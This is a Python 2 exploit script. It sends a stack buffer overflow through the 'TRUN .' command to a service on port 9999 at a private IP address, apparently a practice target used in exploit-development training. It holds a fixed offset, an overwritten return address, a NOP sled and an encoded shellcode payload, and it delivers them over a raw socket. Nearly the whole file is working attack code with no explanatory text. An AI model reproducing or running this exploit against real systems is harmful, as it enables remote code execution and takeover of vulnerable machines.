#!/usr/bin/python2
import socket
server = '192.168.200.236'
sport = 9999

prefix = 'A' * 2006
eip = '\xaf\x11\x50\x62'
nopsled = '\x90' * 16
buf =  b""
buf += b"\xd9\xe8\xbb\xc3\x82\x86\x2c\xd9\x74\x24\xf4\x58"
buf += b"\x31\xc9\xb1\x52\x83\xc0\x04\x31\x58\x13\x03\x9b"
buf += b"\x91\x64\xd9\xe7\x7e\xea\x22\x17\x7f\x8b\xab\xf2"
buf += b"\x4e\x8b\xc8\x77\xe0\x3b\x9a\xd5\x0d\xb7\xce\xcd"
buf += b"\x86\xb5\xc6\xe2\x2f\x73\x31\xcd\xb0\x28\x01\x4c"
buf += b"\x33\x33\x56\xae\x0a\xfc\xab\xaf\x4b\xe1\x46\xfd"
buf += b"\x04\x6d\xf4\x11\x20\x3b\xc5\x9a\x7a\xad\x4d\x7f"
buf += b"\xca\xcc\x7c\x2e\x40\x97\x5e\xd1\x85\xa3\xd6\xc9"
buf += b"\xca\x8e\xa1\x62\x38\x64\x30\xa2\x70\x85\x9f\x8b"
buf += b"\xbc\x74\xe1\xcc\x7b\x67\x94\x24\x78\x1a\xaf\xf3"
buf += b"\x02\xc0\x3a\xe7\xa5\x83\x9d\xc3\x54\x47\x7b\x80"
buf += b"\x5b\x2c\x0f\xce\x7f\xb3\xdc\x65\x7b\x38\xe3\xa9"
buf += b"\x0d\x7a\xc0\x6d\x55\xd8\x69\x34\x33\x8f\x96\x26"
buf += b"\x9c\x70\x33\x2d\x31\x64\x4e\x6c\x5e\x49\x63\x8e"
buf += b"\x9e\xc5\xf4\xfd\xac\x4a\xaf\x69\x9d\x03\x69\x6e"
buf += b"\xe2\x39\xcd\xe0\x1d\xc2\x2e\x29\xda\x96\x7e\x41"
buf += b"\xcb\x96\x14\x91\xf4\x42\xba\xc1\x5a\x3d\x7b\xb1"
buf += b"\x1a\xed\x13\xdb\x94\xd2\x04\xe4\x7e\x7b\xae\x1f"
buf += b"\xe9\x44\x87\xd7\x12\x2c\xda\xe7\xe5\x16\x53\x01"
buf += b"\x8f\x78\x32\x9a\x38\xe0\x1f\x50\xd8\xed\xb5\x1d"
buf += b"\xda\x66\x3a\xe2\x95\x8e\x37\xf0\x42\x7f\x02\xaa"
buf += b"\xc5\x80\xb8\xc2\x8a\x13\x27\x12\xc4\x0f\xf0\x45"
buf += b"\x81\xfe\x09\x03\x3f\x58\xa0\x31\xc2\x3c\x8b\xf1"
buf += b"\x19\xfd\x12\xf8\xec\xb9\x30\xea\x28\x41\x7d\x5e"
buf += b"\xe5\x14\x2b\x08\x43\xcf\x9d\xe2\x1d\xbc\x77\x62"
buf += b"\xdb\x8e\x47\xf4\xe4\xda\x31\x18\x54\xb3\x07\x27"
buf += b"\x59\x53\x80\x50\x87\xc3\x6f\x8b\x03\xe3\x8d\x19"
buf += b"\x7e\x8c\x0b\xc8\xc3\xd1\xab\x27\x07\xec\x2f\xcd"
buf += b"\xf8\x0b\x2f\xa4\xfd\x50\xf7\x55\x8c\xc9\x92\x59"
buf += b"\x23\xe9\xb6"



padding = 'F' * (3000 - 2006 - 4 - 16 - len(buf))
attack = prefix + eip + nopsled + buf + padding

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)
print "Sending attack to TRUN . with length ", len(attack)
s.send(('TRUN .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
